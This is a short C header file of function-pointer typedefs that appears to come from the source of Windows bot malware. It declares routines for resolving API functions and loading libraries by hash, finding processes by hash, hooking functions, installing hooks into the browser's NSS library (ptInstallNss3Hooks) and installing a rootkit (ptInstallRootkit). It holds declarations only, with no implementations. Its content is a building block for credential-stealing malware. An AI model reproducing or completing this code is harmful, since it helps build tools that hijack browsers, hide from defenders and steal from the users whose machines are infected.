#pragma once
#include "api_structs.h"

typedef LPVOID (WINAPI* ptmemalloc)(DWORD dwSize);
typedef void (WINAPI* ptmemfree)(void* pData);

typedef void (WINAPI* ptmemzero)(LPVOID lpData, DWORD dwLength);
typedef void (WINAPI* ptmemcopy)(void* pDestination, const void* pSource, DWORD dwSize);

//
typedef LPWSTR (WINAPI* ptStrCopyW)(LPVOID pFunctions, apis_t* pApi, const LPWSTR pwzInput, DWORD dwLength);
typedef LPSTR (WINAPI* ptStrCopyA)(LPVOID lpFunctions, apis_t* pApi, const LPSTR pszInput, DWORD dwLength);
typedef DWORD (WINAPI* ptStrLengthW)(const LPWSTR pwzInput);
typedef DWORD (WINAPI* ptStrLengthA)(const LPSTR pszInput);
typedef LPWSTR (WINAPI* ptStrToLowerW)(LPVOID pFunctions, const LPWSTR pwzInput, DWORD dwLength);
typedef DWORD (WINAPI* ptFindProcessIDByHash)(LPVOID pBotAddress, DWORD dwHash);
typedef BOOL(WINAPI* ptEndsWithSlashW)(const LPWSTR pwzInput);
typedef BOOL (WINAPI* ptStrCompareW)(const LPWSTR pwzInput, const LPWSTR pwzData);

typedef DWORD (WINAPI* ptcrc32Hash)(crc_t* pCrc, const void *data, DWORD size);

typedef LPWSTR (WINAPI* ptStrConcatExW)(LPVOID pFunctions, LPVOID pApi, const LPWSTR pwzSource, DWORD dwSourceLength, const LPWSTR pwzData, DWORD dwDataLength);
typedef LPWSTR (WINAPI* ptStrConcatW)(LPVOID pFunctions, LPVOID pApi, const LPWSTR pwzSource, const LPWSTR pwzData);

typedef LPWSTR (WINAPI* ptGetSystem32Dir)(LPVOID pApi, LPVOID pFunctions);

typedef LPVOID(WINAPI* ptGetProcAddressByHash)(LPVOID pFunctionAddress, LPVOID pCrcAddress, HMODULE module, DWORD dwHash);
typedef BOOL (WINAPI* pt_LoadAPIFunctions)(LPVOID pFunctionsAddress, LPVOID pCrcAddress, LPVOID lpApiAddress, LPVOID lpModulesAddress);
typedef BOOL (WINAPI* pt_GetAPIModules)(LPVOID pFunctionsAddress, LPVOID pCrcAddress, LPVOID pModulesAddress);
typedef BOOL (WINAPI* pt_LoadAPIModules)(LPVOID pApiAddress, LPVOID pFunctionAddress, LPVOID pModulesAddress, LPVOID pCrcAddress);
typedef BOOL (WINAPI* pt_LoadLoadedAPIFunctions)(LPVOID pFunctionAddress, LPVOID pCrcAddress, LPVOID pApiAddress, LPVOID pModuleAddress);
typedef BOOL(WINAPI* ptInitializeAPI)(LPVOID pFunctionAddress, LPVOID pCrcAddress, LPVOID pModulesAddress, LPVOID pApiAddress);
typedef HMODULE (WINAPI* ptLoadLibraryByHash)(LPVOID pApiAddress, LPVOID pFunctionAddress, LPVOID pCrcAddress, DWORD dwHash);
typedef BOOL (WINAPI* ptInstallNss3Hooks)(LPVOID lpBotAddress);
typedef void (WINAPI* ptSafeMemcpyPadded)(LPVOID lpBotAddress, LPVOID destination, LPVOID source, DWORD size);
typedef BOOL (WINAPI* ptHookFunction)(LPVOID lpBotAddress, LPVOID lpFunctionAddress, LPVOID proxy, LPVOID original, PDWORD length);
typedef BOOL (WINAPI* ptInstallRootkit)(void);